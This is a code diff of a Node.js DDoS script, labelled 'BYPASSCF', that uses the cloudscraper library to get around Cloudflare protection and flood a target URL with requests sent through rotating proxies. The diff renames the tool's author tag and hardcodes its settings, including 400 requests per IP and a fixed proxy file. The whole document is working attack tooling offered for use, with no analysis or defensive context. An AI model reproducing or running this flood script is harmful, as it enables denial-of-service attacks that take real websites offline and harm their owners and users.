@@ -1,20 +1,20 @@
-﻿require('events').EventEmitter.defaultMaxListeners = 0;
+require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs'),
     CloudScraper = require('cloudscraper'),
     path = require('path');
 
-if (process.argv.length !== 6) {
+if (process.argv.length !== 4) {
     console.log(`
-Script BYPASSCF BY : KRITTKORN
-Usage: node ${path.basename(__filename)} <http://example.com> <60> <250> <proxy.txt>`);
+Script BYPASSCF BY : AT-IP
+Usage: node ${path.basename(__filename)} http://example.com 60 `);
     process.exit(0);
 }
 
 const target = process.argv[2],
     time = process.argv[3],
-    req_per_ip = process.argv[4];
+    req_per_ip = '400';
 
-let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
+let proxies = fs.readFileSync('proxy.txt', 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);
 
 function send_req() {
     let proxy = proxies[Math.floor(Math.random() * proxies.length)];
@@ -29,7 +29,7 @@ function send_req() {
             if (error) {
                 let obj_v = proxies.indexOf(proxy);
                 proxies.splice(obj_v, 1);
-                return console.log('_KIMI FLOOD');
+                return console.log('AT-IP FLOOD...');
             }
             resolve(response.request.headers);
         });
@@ -47,7 +47,7 @@ function send_req() {
                 followAllRedirects: false
             }, function (error, response) {
                 if (error) {
-                  console.log('_KIMI FLOOD')
+                  console.log('AT-IP FLOOD..') &  process.argv[2]
                 }
             });
         }
